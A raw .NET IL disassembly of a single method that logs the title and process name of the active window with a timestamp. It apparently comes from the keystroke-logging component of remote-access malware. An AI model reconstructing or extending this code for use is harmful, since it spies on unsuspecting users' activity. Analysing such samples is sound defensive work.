  .method private instance string  AV() cil managed
  {
    // Code size       217 (0xd9)
    .maxstack  4
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             class [mscorlib]System.Exception V_4,
             valuetype [mscorlib]System.DateTime V_5,
             string[] V_6)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brfalse.s  IL_0051

      IL_004c:  leave      IL_00d1

      IL_0051:  ldarg.0
      IL_0052:  ldloca.s   V_2
      IL_0054:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0059:  stfld      int32 j.kl::LastAV
      IL_005e:  ldarg.0
      IL_005f:  ldloc.3
      IL_0060:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0065:  stfld      string j.kl::LastAS
      IL_006a:  ldc.i4.6
      IL_006b:  newarr     [mscorlib]System.String
      IL_0070:  stloc.s    V_6
      IL_0072:  ldloc.s    V_6
      IL_0074:  ldc.i4.0
      IL_0075:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_007a:  stelem.ref
      IL_007b:  ldloc.s    V_6
      IL_007d:  ldc.i4.1
      IL_007e:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_0083:  stloc.s    V_5
      IL_0085:  ldloca.s   V_5
      IL_0087:  ldstr      "yy/MM/dd "
      IL_008c:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0091:  stelem.ref
      IL_0092:  ldloc.s    V_6
      IL_0094:  ldc.i4.2
      IL_0095:  ldloc.3
      IL_0096:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_009b:  stelem.ref
      IL_009c:  ldloc.s    V_6
      IL_009e:  ldc.i4.3
      IL_009f:  ldstr      " "
      IL_00a4:  stelem.ref
      IL_00a5:  ldloc.s    V_6
      IL_00a7:  ldc.i4.4
      IL_00a8:  ldarg.0
      IL_00a9:  ldfld      string j.kl::LastAS
      IL_00ae:  stelem.ref
      IL_00af:  ldloc.s    V_6
      IL_00b1:  ldc.i4.5
      IL_00b2:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00b7:  stelem.ref
      IL_00b8:  ldloc.s    V_6
      IL_00ba:  call       string [mscorlib]System.String::Concat(string[])
      IL_00bf:  stloc.0
      IL_00c0:  leave.s    IL_00d7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c2:  dup
      IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c8:  stloc.s    V_4
      IL_00ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cf:  leave.s    IL_00d1

    }  // end handler
    IL_00d1:  ldstr      ""
    IL_00d6:  ret

    IL_00d7:  ldloc.0
    IL_00d8:  ret
  } // end of method kl::AV
